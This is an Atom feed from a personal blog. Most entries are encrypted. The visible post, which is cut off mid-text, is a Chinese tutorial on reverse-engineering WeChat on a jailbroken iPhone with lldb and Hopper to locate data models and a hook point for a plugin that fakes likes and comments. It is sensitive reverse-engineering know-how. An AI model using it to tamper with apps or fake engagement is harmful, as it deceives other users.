<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-30T09:22:19.922Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-07-30T09:22:19.922Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Password is ESP8266" />    <label for="pass">Password is ESP8266</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" 